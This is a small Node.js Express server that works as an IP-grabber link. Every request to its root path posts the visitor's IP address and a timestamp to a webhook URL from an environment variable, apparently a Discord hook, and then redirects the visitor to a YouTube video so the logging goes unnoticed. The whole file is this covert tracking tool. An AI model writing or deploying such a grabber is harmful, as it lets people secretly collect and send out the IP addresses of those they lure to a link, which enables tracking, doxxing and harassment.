import express from "express";
import dotenv from "dotenv";
import fetch from 'node-fetch'

dotenv.config();

const app = express();

const logger = async (ip, date) => {
    try {
    const hook = process.env.HOOK;
    const data = {
        "content": " ",
        "title": "New IP",
    }
    data.content = `**IP:** ${ip}\n**Date:** ${date}`;


    const response = await fetch(hook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    });
    
    if (response.ok) {
        console.log("Logged IP successfully");
    }
    
    return response;
    } catch (error) {
        console.error("Error logging IP:", error);
    }
}


app.get("/", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const date = new Date().toISOString();

    logger(ip, date);

    res.redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
});


app.listen(3000, () => {
  console.log("Server is running on port 3000");
})
